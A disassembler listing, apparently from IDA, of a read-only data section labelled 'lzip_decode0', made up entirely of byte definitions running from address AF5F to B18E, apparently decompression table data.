.rodata.lzip_decode0:000000000000AF5F                 db    0
.rodata.lzip_decode0:000000000000AF60                 db 0B2h
.rodata.lzip_decode0:000000000000AF61                 db    0
.rodata.lzip_decode0:000000000000AF62                 db    0
.rodata.lzip_decode0:000000000000AF63                 db    0
.rodata.lzip_decode0:000000000000AF64                 db    3
.rodata.lzip_decode0:000000000000AF65                 db    0
.rodata.lzip_decode0:000000000000AF66                 db    0
.rodata.lzip_decode0:000000000000AF67                 db    0
.rodata.lzip_decode0:000000000000AF68                 db  12h
.rodata.lzip_decode0:000000000000AF69                 db    0
.rodata.lzip_decode0:000000000000AF6A                 db    0
.rodata.lzip_decode0:000000000000AF6B                 db    0
.rodata.lzip_decode0:000000000000AF6C                 db    4
.rodata.lzip_decode0:000000000000AF6D                 db    0
.rodata.lzip_decode0:000000000000AF6E                 db    8
.rodata.lzip_decode0:000000000000AF6F                 db    7
.rodata.lzip_decode0:000000000000AF70                 db    4
.rodata.lzip_decode0:000000000000AF71                 db    0
.rodata.lzip_decode0:000000000000AF72                 db    8
.rodata.lzip_decode0:000000000000AF73                 db    1
.rodata.lzip_decode0:000000000000AF74                 db  12h
.rodata.lzip_decode0:000000000000AF75                 db    0
.rodata.lzip_decode0:000000000000AF76                 db    0
.rodata.lzip_decode0:000000000000AF77                 db    0
.rodata.lzip_decode0:000000000000AF78                 db  63h ; c
.rodata.lzip_decode0:000000000000AF79                 db    0
.rodata.lzip_decode0:000000000000AF7A                 db    0
.rodata.lzip_decode0:000000000000AF7B                 db    0
.rodata.lzip_decode0:000000000000AF7C                 db    3
.rodata.lzip_decode0:000000000000AF7D                 db    0
.rodata.lzip_decode0:000000000000AF7E                 db    0
.rodata.lzip_decode0:000000000000AF7F                 db    0
.rodata.lzip_decode0:000000000000AF80                 db  13h
.rodata.lzip_decode0:000000000000AF81                 db    0
.rodata.lzip_decode0:000000000000AF82                 db    0
.rodata.lzip_decode0:000000000000AF83                 db    0
.rodata.lzip_decode0:000000000000AF84                 db 0F2h
.rodata.lzip_decode0:000000000000AF85                 db    0
.rodata.lzip_decode0:000000000000AF86                 db    0
.rodata.lzip_decode0:000000000000AF87                 db    0
.rodata.lzip_decode0:000000000000AF88                 db    3
.rodata.lzip_decode0:000000000000AF89                 db    0
.rodata.lzip_decode0:000000000000AF8A                 db    0
.rodata.lzip_decode0:000000000000AF8B                 db    0
.rodata.lzip_decode0:000000000000AF8C                 db 0A3h
.rodata.lzip_decode0:000000000000AF8D                 db    0
.rodata.lzip_decode0:000000000000AF8E                 db    0
.rodata.lzip_decode0:000000000000AF8F                 db    0
.rodata.lzip_decode0:000000000000AF90                 db  92h
.rodata.lzip_decode0:000000000000AF91                 db    0
.rodata.lzip_decode0:000000000000AF92                 db    0
.rodata.lzip_decode0:000000000000AF93                 db    0
.rodata.lzip_decode0:000000000000AF94                 db  33h ; 3
.rodata.lzip_decode0:000000000000AF95                 db    1
.rodata.lzip_decode0:000000000000AF96                 db    0
.rodata.lzip_decode0:000000000000AF97                 db    0
.rodata.lzip_decode0:000000000000AF98                 db 0F2h
.rodata.lzip_decode0:000000000000AF99                 db    0
.rodata.lzip_decode0:000000000000AF9A                 db    0
.rodata.lzip_decode0:000000000000AF9B                 db    0
.rodata.lzip_decode0:000000000000AF9C                 db  43h ; C
.rodata.lzip_decode0:000000000000AF9D                 db    1
.rodata.lzip_decode0:000000000000AF9E                 db    0
.rodata.lzip_decode0:000000000000AF9F                 db    0
.rodata.lzip_decode0:000000000000AFA0                 db  22h ; "
.rodata.lzip_decode0:000000000000AFA1                 db    0
.rodata.lzip_decode0:000000000000AFA2                 db    0
.rodata.lzip_decode0:000000000000AFA3                 db    0
.rodata.lzip_decode0:000000000000AFA4                 db  22h ; "
.rodata.lzip_decode0:000000000000AFA5                 db    1
.rodata.lzip_decode0:000000000000AFA6                 db    0
.rodata.lzip_decode0:000000000000AFA7                 db    0
.rodata.lzip_decode0:000000000000AFA8                 db    4
.rodata.lzip_decode0:000000000000AFA9                 db    0
.rodata.lzip_decode0:000000000000AFAA                 db  70h ; p
.rodata.lzip_decode0:000000000000AFAB                 db    8
.rodata.lzip_decode0:000000000000AFAC                 db  22h ; "
.rodata.lzip_decode0:000000000000AFAD                 db    0
.rodata.lzip_decode0:000000000000AFAE                 db    0
.rodata.lzip_decode0:000000000000AFAF                 db    0
.rodata.lzip_decode0:000000000000AFB0                 db  23h ; #
.rodata.lzip_decode0:000000000000AFB1                 db    0
.rodata.lzip_decode0:000000000000AFB2                 db    0
.rodata.lzip_decode0:000000000000AFB3                 db    0
.rodata.lzip_decode0:000000000000AFB4                 db  72h ; r
.rodata.lzip_decode0:000000000000AFB5                 db    1
.rodata.lzip_decode0:000000000000AFB6                 db    0
.rodata.lzip_decode0:000000000000AFB7                 db    0
.rodata.lzip_decode0:000000000000AFB8                 db 0B3h
.rodata.lzip_decode0:000000000000AFB9                 db    1
.rodata.lzip_decode0:000000000000AFBA                 db    0
.rodata.lzip_decode0:000000000000AFBB                 db    0
.rodata.lzip_decode0:000000000000AFBC                 db  92h
.rodata.lzip_decode0:000000000000AFBD                 db    0
.rodata.lzip_decode0:000000000000AFBE                 db    0
.rodata.lzip_decode0:000000000000AFBF                 db    0
.rodata.lzip_decode0:000000000000AFC0                 db  83h
.rodata.lzip_decode0:000000000000AFC1                 db    0
.rodata.lzip_decode0:000000000000AFC2                 db    0
.rodata.lzip_decode0:000000000000AFC3                 db    0
.rodata.lzip_decode0:000000000000AFC4                 db  23h ; #
.rodata.lzip_decode0:000000000000AFC5                 db    0
.rodata.lzip_decode0:000000000000AFC6                 db    0
.rodata.lzip_decode0:000000000000AFC7                 db    0
.rodata.lzip_decode0:000000000000AFC8                 db  82h
.rodata.lzip_decode0:000000000000AFC9                 db    1
.rodata.lzip_decode0:000000000000AFCA                 db    0
.rodata.lzip_decode0:000000000000AFCB                 db    0
.rodata.lzip_decode0:000000000000AFCC                 db  63h ; c
.rodata.lzip_decode0:000000000000AFCD                 db    1
.rodata.lzip_decode0:000000000000AFCE                 db    0
.rodata.lzip_decode0:000000000000AFCF                 db    0
.rodata.lzip_decode0:000000000000AFD0                 db  13h
.rodata.lzip_decode0:000000000000AFD1                 db    0
.rodata.lzip_decode0:000000000000AFD2                 db    0
.rodata.lzip_decode0:000000000000AFD3                 db    0
.rodata.lzip_decode0:000000000000AFD4                 db    4
.rodata.lzip_decode0:000000000000AFD5                 db    0
.rodata.lzip_decode0:000000000000AFD6                 db 0A0h
.rodata.lzip_decode0:000000000000AFD7                 db    1
.rodata.lzip_decode0:000000000000AFD8                 db  22h ; "
.rodata.lzip_decode0:000000000000AFD9                 db    0
.rodata.lzip_decode0:000000000000AFDA                 db    0
.rodata.lzip_decode0:000000000000AFDB                 db    0
.rodata.lzip_decode0:000000000000AFDC                 db  23h ; #
.rodata.lzip_decode0:000000000000AFDD                 db    0
.rodata.lzip_decode0:000000000000AFDE                 db    0
.rodata.lzip_decode0:000000000000AFDF                 db    0
.rodata.lzip_decode0:000000000000AFE0                 db  72h ; r
.rodata.lzip_decode0:000000000000AFE1                 db    1
.rodata.lzip_decode0:000000000000AFE2                 db    0
.rodata.lzip_decode0:000000000000AFE3                 db    0
.rodata.lzip_decode0:000000000000AFE4                 db 0B3h
.rodata.lzip_decode0:000000000000AFE5                 db    1
.rodata.lzip_decode0:000000000000AFE6                 db    0
.rodata.lzip_decode0:000000000000AFE7                 db    0
.rodata.lzip_decode0:000000000000AFE8                 db 0B2h
.rodata.lzip_decode0:000000000000AFE9                 db    1
.rodata.lzip_decode0:000000000000AFEA                 db    0
.rodata.lzip_decode0:000000000000AFEB                 db    0
.rodata.lzip_decode0:000000000000AFEC                 db    3
.rodata.lzip_decode0:000000000000AFED                 db    0
.rodata.lzip_decode0:000000000000AFEE                 db    0
.rodata.lzip_decode0:000000000000AFEF                 db    0
.rodata.lzip_decode0:000000000000AFF0                 db    3
.rodata.lzip_decode0:000000000000AFF1                 db    0
.rodata.lzip_decode0:000000000000AFF2                 db    0
.rodata.lzip_decode0:000000000000AFF3                 db    0
.rodata.lzip_decode0:000000000000AFF4                 db    3
.rodata.lzip_decode0:000000000000AFF5                 db    0
.rodata.lzip_decode0:000000000000AFF6                 db    0
.rodata.lzip_decode0:000000000000AFF7                 db    0
.rodata.lzip_decode0:000000000000AFF8                 db  23h ; #
.rodata.lzip_decode0:000000000000AFF9                 db    1
.rodata.lzip_decode0:000000000000AFFA                 db    0
.rodata.lzip_decode0:000000000000AFFB                 db    0
.rodata.lzip_decode0:000000000000AFFC                 db  43h ; C
.rodata.lzip_decode0:000000000000AFFD                 db    0
.rodata.lzip_decode0:000000000000AFFE                 db    0
.rodata.lzip_decode0:000000000000AFFF                 db    0
.rodata.lzip_decode0:000000000000B000                 db 0C2h
.rodata.lzip_decode0:000000000000B001                 db    0
.rodata.lzip_decode0:000000000000B002                 db    0
.rodata.lzip_decode0:000000000000B003                 db    0
.rodata.lzip_decode0:000000000000B004                 db  90h
.rodata.lzip_decode0:000000000000B005                 db    1
.rodata.lzip_decode0:000000000000B006                 db  30h ; 0
.rodata.lzip_decode0:000000000000B007                 db    0
.rodata.lzip_decode0:000000000000B008                 db  72h ; r
.rodata.lzip_decode0:000000000000B009                 db    0
.rodata.lzip_decode0:000000000000B00A                 db    0
.rodata.lzip_decode0:000000000000B00B                 db    0
.rodata.lzip_decode0:000000000000B00C                 db  21h ; !
.rodata.lzip_decode0:000000000000B00D                 db    1
.rodata.lzip_decode0:000000000000B00E                 db    4
.rodata.lzip_decode0:000000000000B00F                 db    0
.rodata.lzip_decode0:000000000000B010                 db    3
.rodata.lzip_decode0:000000000000B011                 db    1
.rodata.lzip_decode0:000000000000B012                 db    0
.rodata.lzip_decode0:000000000000B013                 db    0
.rodata.lzip_decode0:000000000000B014                 db  92h
.rodata.lzip_decode0:000000000000B015                 db    0
.rodata.lzip_decode0:000000000000B016                 db    0
.rodata.lzip_decode0:000000000000B017                 db    0
.rodata.lzip_decode0:000000000000B018                 db  22h ; "
.rodata.lzip_decode0:000000000000B019                 db    1
.rodata.lzip_decode0:000000000000B01A                 db    0
.rodata.lzip_decode0:000000000000B01B                 db    0
.rodata.lzip_decode0:000000000000B01C                 db  32h ; 2
.rodata.lzip_decode0:000000000000B01D                 db    0
.rodata.lzip_decode0:000000000000B01E                 db    0
.rodata.lzip_decode0:000000000000B01F                 db    0
.rodata.lzip_decode0:000000000000B020                 db  33h ; 3
.rodata.lzip_decode0:000000000000B021                 db    1
.rodata.lzip_decode0:000000000000B022                 db    0
.rodata.lzip_decode0:000000000000B023                 db    0
.rodata.lzip_decode0:000000000000B024                 db 0D2h
.rodata.lzip_decode0:000000000000B025                 db    0
.rodata.lzip_decode0:000000000000B026                 db    0
.rodata.lzip_decode0:000000000000B027                 db    0
.rodata.lzip_decode0:000000000000B028                 db  12h
.rodata.lzip_decode0:000000000000B029                 db    0
.rodata.lzip_decode0:000000000000B02A                 db    0
.rodata.lzip_decode0:000000000000B02B                 db    0
.rodata.lzip_decode0:000000000000B02C                 db  13h
.rodata.lzip_decode0:000000000000B02D                 db    0
.rodata.lzip_decode0:000000000000B02E                 db    0
.rodata.lzip_decode0:000000000000B02F                 db    0
.rodata.lzip_decode0:000000000000B030                 db    4
.rodata.lzip_decode0:000000000000B031                 db    0
.rodata.lzip_decode0:000000000000B032                 db  40h ; @
.rodata.lzip_decode0:000000000000B033                 db  0Ch
.rodata.lzip_decode0:000000000000B034                 db 0E2h
.rodata.lzip_decode0:000000000000B035                 db    0
.rodata.lzip_decode0:000000000000B036                 db    0
.rodata.lzip_decode0:000000000000B037                 db    0
.rodata.lzip_decode0:000000000000B038                 db    3
.rodata.lzip_decode0:000000000000B039                 db    0
.rodata.lzip_decode0:000000000000B03A                 db    0
.rodata.lzip_decode0:000000000000B03B                 db    0
.rodata.lzip_decode0:000000000000B03C                 db  53h ; S
.rodata.lzip_decode0:000000000000B03D                 db    1
.rodata.lzip_decode0:000000000000B03E                 db    0
.rodata.lzip_decode0:000000000000B03F                 db    0
.rodata.lzip_decode0:000000000000B040                 db  22h ; "
.rodata.lzip_decode0:000000000000B041                 db    1
.rodata.lzip_decode0:000000000000B042                 db    0
.rodata.lzip_decode0:000000000000B043                 db    0
.rodata.lzip_decode0:000000000000B044                 db    4
.rodata.lzip_decode0:000000000000B045                 db    0
.rodata.lzip_decode0:000000000000B046                 db 0D0h
.rodata.lzip_decode0:000000000000B047                 db    6
.rodata.lzip_decode0:000000000000B048                 db 0E2h
.rodata.lzip_decode0:000000000000B049                 db    0
.rodata.lzip_decode0:000000000000B04A                 db    0
.rodata.lzip_decode0:000000000000B04B                 db    0
.rodata.lzip_decode0:000000000000B04C                 db 0A3h
.rodata.lzip_decode0:000000000000B04D                 db    0
.rodata.lzip_decode0:000000000000B04E                 db    0
.rodata.lzip_decode0:000000000000B04F                 db    0
.rodata.lzip_decode0:000000000000B050                 db  92h
.rodata.lzip_decode0:000000000000B051                 db    0
.rodata.lzip_decode0:000000000000B052                 db    0
.rodata.lzip_decode0:000000000000B053                 db    0
.rodata.lzip_decode0:000000000000B054                 db  53h ; S
.rodata.lzip_decode0:000000000000B055                 db    1
.rodata.lzip_decode0:000000000000B056                 db    0
.rodata.lzip_decode0:000000000000B057                 db    0
.rodata.lzip_decode0:000000000000B058                 db 0A0h
.rodata.lzip_decode0:000000000000B059                 db    0
.rodata.lzip_decode0:000000000000B05A                 db  14h
.rodata.lzip_decode0:000000000000B05B                 db    0
.rodata.lzip_decode0:000000000000B05C                 db 0D2h
.rodata.lzip_decode0:000000000000B05D                 db    1
.rodata.lzip_decode0:000000000000B05E                 db    0
.rodata.lzip_decode0:000000000000B05F                 db    0
.rodata.lzip_decode0:000000000000B060                 db    4
.rodata.lzip_decode0:000000000000B061                 db    0
.rodata.lzip_decode0:000000000000B062                 db  58h ; X
.rodata.lzip_decode0:000000000000B063                 db    9
.rodata.lzip_decode0:000000000000B064                 db  62h ; b
.rodata.lzip_decode0:000000000000B065                 db    0
.rodata.lzip_decode0:000000000000B066                 db    0
.rodata.lzip_decode0:000000000000B067                 db    0
.rodata.lzip_decode0:000000000000B068                 db  92h
.rodata.lzip_decode0:000000000000B069                 db    0
.rodata.lzip_decode0:000000000000B06A                 db    0
.rodata.lzip_decode0:000000000000B06B                 db    0
.rodata.lzip_decode0:000000000000B06C                 db    4
.rodata.lzip_decode0:000000000000B06D                 db    0
.rodata.lzip_decode0:000000000000B06E                 db  18h
.rodata.lzip_decode0:000000000000B06F                 db    4
.rodata.lzip_decode0:000000000000B070                 db  42h ; B
.rodata.lzip_decode0:000000000000B071                 db    1
.rodata.lzip_decode0:000000000000B072                 db    0
.rodata.lzip_decode0:000000000000B073                 db    0
.rodata.lzip_decode0:000000000000B074                 db  13h
.rodata.lzip_decode0:000000000000B075                 db    0
.rodata.lzip_decode0:000000000000B076                 db    0
.rodata.lzip_decode0:000000000000B077                 db    0
.rodata.lzip_decode0:000000000000B078                 db 0B3h
.rodata.lzip_decode0:000000000000B079                 db    1
.rodata.lzip_decode0:000000000000B07A                 db    0
.rodata.lzip_decode0:000000000000B07B                 db    0
.rodata.lzip_decode0:000000000000B07C                 db    4
.rodata.lzip_decode0:000000000000B07D                 db    0
.rodata.lzip_decode0:000000000000B07E                 db 0E0h
.rodata.lzip_decode0:000000000000B07F                 db    4
.rodata.lzip_decode0:000000000000B080                 db  33h ; 3
.rodata.lzip_decode0:000000000000B081                 db    0
.rodata.lzip_decode0:000000000000B082                 db    0
.rodata.lzip_decode0:000000000000B083                 db    0
.rodata.lzip_decode0:000000000000B084                 db 0A2h
.rodata.lzip_decode0:000000000000B085                 db    1
.rodata.lzip_decode0:000000000000B086                 db    0
.rodata.lzip_decode0:000000000000B087                 db    0
.rodata.lzip_decode0:000000000000B088                 db  43h ; C
.rodata.lzip_decode0:000000000000B089                 db    1
.rodata.lzip_decode0:000000000000B08A                 db    0
.rodata.lzip_decode0:000000000000B08B                 db    0
.rodata.lzip_decode0:000000000000B08C                 db  92h
.rodata.lzip_decode0:000000000000B08D                 db    0
.rodata.lzip_decode0:000000000000B08E                 db    0
.rodata.lzip_decode0:000000000000B08F                 db    0
.rodata.lzip_decode0:000000000000B090                 db 0A2h
.rodata.lzip_decode0:000000000000B091                 db    0
.rodata.lzip_decode0:000000000000B092                 db    0
.rodata.lzip_decode0:000000000000B093                 db    0
.rodata.lzip_decode0:000000000000B094                 db  33h ; 3
.rodata.lzip_decode0:000000000000B095                 db    2
.rodata.lzip_decode0:000000000000B096                 db    0
.rodata.lzip_decode0:000000000000B097                 db    0
.rodata.lzip_decode0:000000000000B098                 db  72h ; r
.rodata.lzip_decode0:000000000000B099                 db    1
.rodata.lzip_decode0:000000000000B09A                 db    0
.rodata.lzip_decode0:000000000000B09B                 db    0
.rodata.lzip_decode0:000000000000B09C                 db  10h
.rodata.lzip_decode0:000000000000B09D                 db    0
.rodata.lzip_decode0:000000000000B09E                 db  40h ; @
.rodata.lzip_decode0:000000000000B09F                 db    0
.rodata.lzip_decode0:000000000000B0A0                 db 0A0h
.rodata.lzip_decode0:000000000000B0A1                 db    0
.rodata.lzip_decode0:000000000000B0A2                 db  30h ; 0
.rodata.lzip_decode0:000000000000B0A3                 db    0
.rodata.lzip_decode0:000000000000B0A4                 db    0
.rodata.lzip_decode0:000000000000B0A5                 db    2
.rodata.lzip_decode0:000000000000B0A6                 db  20h
.rodata.lzip_decode0:000000000000B0A7                 db    0
.rodata.lzip_decode0:000000000000B0A8                 db 0A2h
.rodata.lzip_decode0:000000000000B0A9                 db    0
.rodata.lzip_decode0:000000000000B0AA                 db    0
.rodata.lzip_decode0:000000000000B0AB                 db    0
.rodata.lzip_decode0:000000000000B0AC                 db  21h ; !
.rodata.lzip_decode0:000000000000B0AD                 db    0
.rodata.lzip_decode0:000000000000B0AE                 db  0Ch
.rodata.lzip_decode0:000000000000B0AF                 db    0
.rodata.lzip_decode0:000000000000B0B0                 db  12h
.rodata.lzip_decode0:000000000000B0B1                 db    0
.rodata.lzip_decode0:000000000000B0B2                 db    0
.rodata.lzip_decode0:000000000000B0B3                 db    0
.rodata.lzip_decode0:000000000000B0B4                 db    4
.rodata.lzip_decode0:000000000000B0B5                 db    0
.rodata.lzip_decode0:000000000000B0B6                 db  90h
.rodata.lzip_decode0:000000000000B0B7                 db    7
.rodata.lzip_decode0:000000000000B0B8                 db 0B2h
.rodata.lzip_decode0:000000000000B0B9                 db    1
.rodata.lzip_decode0:000000000000B0BA                 db    0
.rodata.lzip_decode0:000000000000B0BB                 db    0
.rodata.lzip_decode0:000000000000B0BC                 db  53h ; S
.rodata.lzip_decode0:000000000000B0BD                 db    0
.rodata.lzip_decode0:000000000000B0BE                 db    0
.rodata.lzip_decode0:000000000000B0BF                 db    0
.rodata.lzip_decode0:000000000000B0C0                 db  93h
.rodata.lzip_decode0:000000000000B0C1                 db    1
.rodata.lzip_decode0:000000000000B0C2                 db    0
.rodata.lzip_decode0:000000000000B0C3                 db    0
.rodata.lzip_decode0:000000000000B0C4                 db  92h
.rodata.lzip_decode0:000000000000B0C5                 db    0
.rodata.lzip_decode0:000000000000B0C6                 db    0
.rodata.lzip_decode0:000000000000B0C7                 db    0
.rodata.lzip_decode0:000000000000B0C8                 db  22h ; "
.rodata.lzip_decode0:000000000000B0C9                 db    1
.rodata.lzip_decode0:000000000000B0CA                 db    0
.rodata.lzip_decode0:000000000000B0CB                 db    0
.rodata.lzip_decode0:000000000000B0CC                 db  83h
.rodata.lzip_decode0:000000000000B0CD                 db    1
.rodata.lzip_decode0:000000000000B0CE                 db    0
.rodata.lzip_decode0:000000000000B0CF                 db    0
.rodata.lzip_decode0:000000000000B0D0                 db  53h ; S
.rodata.lzip_decode0:000000000000B0D1                 db    0
.rodata.lzip_decode0:000000000000B0D2                 db    0
.rodata.lzip_decode0:000000000000B0D3                 db    0
.rodata.lzip_decode0:000000000000B0D4                 db  82h
.rodata.lzip_decode0:000000000000B0D5                 db    0
.rodata.lzip_decode0:000000000000B0D6                 db    0
.rodata.lzip_decode0:000000000000B0D7                 db    0
.rodata.lzip_decode0:000000000000B0D8                 db  32h ; 2
.rodata.lzip_decode0:000000000000B0D9                 db    1
.rodata.lzip_decode0:000000000000B0DA                 db    0
.rodata.lzip_decode0:000000000000B0DB                 db    0
.rodata.lzip_decode0:000000000000B0DC                 db    3
.rodata.lzip_decode0:000000000000B0DD                 db    2
.rodata.lzip_decode0:000000000000B0DE                 db    0
.rodata.lzip_decode0:000000000000B0DF                 db    0
.rodata.lzip_decode0:000000000000B0E0                 db  62h ; b
.rodata.lzip_decode0:000000000000B0E1                 db    1
.rodata.lzip_decode0:000000000000B0E2                 db    0
.rodata.lzip_decode0:000000000000B0E3                 db    0
.rodata.lzip_decode0:000000000000B0E4                 db  63h ; c
.rodata.lzip_decode0:000000000000B0E5                 db    1
.rodata.lzip_decode0:000000000000B0E6                 db    0
.rodata.lzip_decode0:000000000000B0E7                 db    0
.rodata.lzip_decode0:000000000000B0E8                 db 0B2h
.rodata.lzip_decode0:000000000000B0E9                 db    0
.rodata.lzip_decode0:000000000000B0EA                 db    0
.rodata.lzip_decode0:000000000000B0EB                 db    0
.rodata.lzip_decode0:000000000000B0EC                 db  22h ; "
.rodata.lzip_decode0:000000000000B0ED                 db    1
.rodata.lzip_decode0:000000000000B0EE                 db    0
.rodata.lzip_decode0:000000000000B0EF                 db    0
.rodata.lzip_decode0:000000000000B0F0                 db  33h ; 3
.rodata.lzip_decode0:000000000000B0F1                 db    0
.rodata.lzip_decode0:000000000000B0F2                 db    0
.rodata.lzip_decode0:000000000000B0F3                 db    0
.rodata.lzip_decode0:000000000000B0F4                 db  33h ; 3
.rodata.lzip_decode0:000000000000B0F5                 db    0
.rodata.lzip_decode0:000000000000B0F6                 db    0
.rodata.lzip_decode0:000000000000B0F7                 db    0
.rodata.lzip_decode0:000000000000B0F8                 db  73h ; s
.rodata.lzip_decode0:000000000000B0F9                 db    0
.rodata.lzip_decode0:000000000000B0FA                 db    0
.rodata.lzip_decode0:000000000000B0FB                 db    0
.rodata.lzip_decode0:000000000000B0FC                 db    4
.rodata.lzip_decode0:000000000000B0FD                 db    0
.rodata.lzip_decode0:000000000000B0FE                 db  18h
.rodata.lzip_decode0:000000000000B0FF                 db    0
.rodata.lzip_decode0:000000000000B100                 db 0D2h
.rodata.lzip_decode0:000000000000B101                 db    1
.rodata.lzip_decode0:000000000000B102                 db    0
.rodata.lzip_decode0:000000000000B103                 db    0
.rodata.lzip_decode0:000000000000B104                 db  13h
.rodata.lzip_decode0:000000000000B105                 db    2
.rodata.lzip_decode0:000000000000B106                 db    0
.rodata.lzip_decode0:000000000000B107                 db    0
.rodata.lzip_decode0:000000000000B108                 db  52h ; R
.rodata.lzip_decode0:000000000000B109                 db    0
.rodata.lzip_decode0:000000000000B10A                 db    0
.rodata.lzip_decode0:000000000000B10B                 db    0
.rodata.lzip_decode0:000000000000B10C                 db 0D3h
.rodata.lzip_decode0:000000000000B10D                 db    0
.rodata.lzip_decode0:000000000000B10E                 db    0
.rodata.lzip_decode0:000000000000B10F                 db    0
.rodata.lzip_decode0:000000000000B110                 db    2
.rodata.lzip_decode0:000000000000B111                 db    1
.rodata.lzip_decode0:000000000000B112                 db    0
.rodata.lzip_decode0:000000000000B113                 db    0
.rodata.lzip_decode0:000000000000B114                 db 0C3h
.rodata.lzip_decode0:000000000000B115                 db    0
.rodata.lzip_decode0:000000000000B116                 db    0
.rodata.lzip_decode0:000000000000B117                 db    0
.rodata.lzip_decode0:000000000000B118                 db  52h ; R
.rodata.lzip_decode0:000000000000B119                 db    0
.rodata.lzip_decode0:000000000000B11A                 db    0
.rodata.lzip_decode0:000000000000B11B                 db    0
.rodata.lzip_decode0:000000000000B11C                 db 0D3h
.rodata.lzip_decode0:000000000000B11D                 db    0
.rodata.lzip_decode0:000000000000B11E                 db    0
.rodata.lzip_decode0:000000000000B11F                 db    0
.rodata.lzip_decode0:000000000000B120                 db 0B2h
.rodata.lzip_decode0:000000000000B121                 db    1
.rodata.lzip_decode0:000000000000B122                 db    0
.rodata.lzip_decode0:000000000000B123                 db    0
.rodata.lzip_decode0:000000000000B124                 db 0A3h
.rodata.lzip_decode0:000000000000B125                 db    1
.rodata.lzip_decode0:000000000000B126                 db    0
.rodata.lzip_decode0:000000000000B127                 db    0
.rodata.lzip_decode0:000000000000B128                 db  23h ; #
.rodata.lzip_decode0:000000000000B129                 db    0
.rodata.lzip_decode0:000000000000B12A                 db    0
.rodata.lzip_decode0:000000000000B12B                 db    0
.rodata.lzip_decode0:000000000000B12C                 db 0E2h
.rodata.lzip_decode0:000000000000B12D                 db    1
.rodata.lzip_decode0:000000000000B12E                 db    0
.rodata.lzip_decode0:000000000000B12F                 db    0
.rodata.lzip_decode0:000000000000B130                 db  33h ; 3
.rodata.lzip_decode0:000000000000B131                 db    0
.rodata.lzip_decode0:000000000000B132                 db    0
.rodata.lzip_decode0:000000000000B133                 db    0
.rodata.lzip_decode0:000000000000B134                 db  33h ; 3
.rodata.lzip_decode0:000000000000B135                 db    0
.rodata.lzip_decode0:000000000000B136                 db    0
.rodata.lzip_decode0:000000000000B137                 db    0
.rodata.lzip_decode0:000000000000B138                 db 0B3h
.rodata.lzip_decode0:000000000000B139                 db    1
.rodata.lzip_decode0:000000000000B13A                 db    0
.rodata.lzip_decode0:000000000000B13B                 db    0
.rodata.lzip_decode0:000000000000B13C                 db 0A2h
.rodata.lzip_decode0:000000000000B13D                 db    0
.rodata.lzip_decode0:000000000000B13E                 db    0
.rodata.lzip_decode0:000000000000B13F                 db    0
.rodata.lzip_decode0:000000000000B140                 db  53h ; S
.rodata.lzip_decode0:000000000000B141                 db    0
.rodata.lzip_decode0:000000000000B142                 db    0
.rodata.lzip_decode0:000000000000B143                 db    0
.rodata.lzip_decode0:000000000000B144                 db 0B3h
.rodata.lzip_decode0:000000000000B145                 db    0
.rodata.lzip_decode0:000000000000B146                 db    0
.rodata.lzip_decode0:000000000000B147                 db    0
.rodata.lzip_decode0:000000000000B148                 db 0C2h
.rodata.lzip_decode0:000000000000B149                 db    1
.rodata.lzip_decode0:000000000000B14A                 db    0
.rodata.lzip_decode0:000000000000B14B                 db    0
.rodata.lzip_decode0:000000000000B14C                 db 0D3h
.rodata.lzip_decode0:000000000000B14D                 db    1
.rodata.lzip_decode0:000000000000B14E                 db    0
.rodata.lzip_decode0:000000000000B14F                 db    0
.rodata.lzip_decode0:000000000000B150                 db    3
.rodata.lzip_decode0:000000000000B151                 db    0
.rodata.lzip_decode0:000000000000B152                 db    0
.rodata.lzip_decode0:000000000000B153                 db    0
.rodata.lzip_decode0:000000000000B154                 db  22h ; "
.rodata.lzip_decode0:000000000000B155                 db    0
.rodata.lzip_decode0:000000000000B156                 db    0
.rodata.lzip_decode0:000000000000B157                 db    0
.rodata.lzip_decode0:000000000000B158                 db  63h ; c
.rodata.lzip_decode0:000000000000B159                 db    0
.rodata.lzip_decode0:000000000000B15A                 db    0
.rodata.lzip_decode0:000000000000B15B                 db    0
.rodata.lzip_decode0:000000000000B15C                 db  12h
.rodata.lzip_decode0:000000000000B15D                 db    0
.rodata.lzip_decode0:000000000000B15E                 db    0
.rodata.lzip_decode0:000000000000B15F                 db    0
.rodata.lzip_decode0:000000000000B160                 db 0E2h
.rodata.lzip_decode0:000000000000B161                 db    1
.rodata.lzip_decode0:000000000000B162                 db    0
.rodata.lzip_decode0:000000000000B163                 db    0
.rodata.lzip_decode0:000000000000B164                 db  23h ; #
.rodata.lzip_decode0:000000000000B165                 db    2
.rodata.lzip_decode0:000000000000B166                 db    0
.rodata.lzip_decode0:000000000000B167                 db    0
.rodata.lzip_decode0:000000000000B168                 db  22h ; "
.rodata.lzip_decode0:000000000000B169                 db    0
.rodata.lzip_decode0:000000000000B16A                 db    0
.rodata.lzip_decode0:000000000000B16B                 db    0
.rodata.lzip_decode0:000000000000B16C                 db 0A2h
.rodata.lzip_decode0:000000000000B16D                 db    0
.rodata.lzip_decode0:000000000000B16E                 db    0
.rodata.lzip_decode0:000000000000B16F                 db    0
.rodata.lzip_decode0:000000000000B170                 db  53h ; S
.rodata.lzip_decode0:000000000000B171                 db    0
.rodata.lzip_decode0:000000000000B172                 db    0
.rodata.lzip_decode0:000000000000B173                 db    0
.rodata.lzip_decode0:000000000000B174                 db  63h ; c
.rodata.lzip_decode0:000000000000B175                 db    0
.rodata.lzip_decode0:000000000000B176                 db    0
.rodata.lzip_decode0:000000000000B177                 db    0
.rodata.lzip_decode0:000000000000B178                 db    4
.rodata.lzip_decode0:000000000000B179                 db    0
.rodata.lzip_decode0:000000000000B17A                 db 0B0h
.rodata.lzip_decode0:000000000000B17B                 db    0
.rodata.lzip_decode0:000000000000B17C                 db  82h
.rodata.lzip_decode0:000000000000B17D                 db    1
.rodata.lzip_decode0:000000000000B17E                 db    0
.rodata.lzip_decode0:000000000000B17F                 db    0
.rodata.lzip_decode0:000000000000B180                 db  53h ; S
.rodata.lzip_decode0:000000000000B181                 db    0
.rodata.lzip_decode0:000000000000B182                 db    0
.rodata.lzip_decode0:000000000000B183                 db    0
.rodata.lzip_decode0:000000000000B184                 db    3
.rodata.lzip_decode0:000000000000B185                 db    0
.rodata.lzip_decode0:000000000000B186                 db    0
.rodata.lzip_decode0:000000000000B187                 db    0
.rodata.lzip_decode0:000000000000B188                 db    3
.rodata.lzip_decode0:000000000000B189                 db    0
.rodata.lzip_decode0:000000000000B18A                 db    0
.rodata.lzip_decode0:000000000000B18B                 db    0
.rodata.lzip_decode0:000000000000B18C                 db 0E3h
.rodata.lzip_decode0:000000000000B18D                 db    1
.rodata.lzip_decode0:000000000000B18E                 db    0
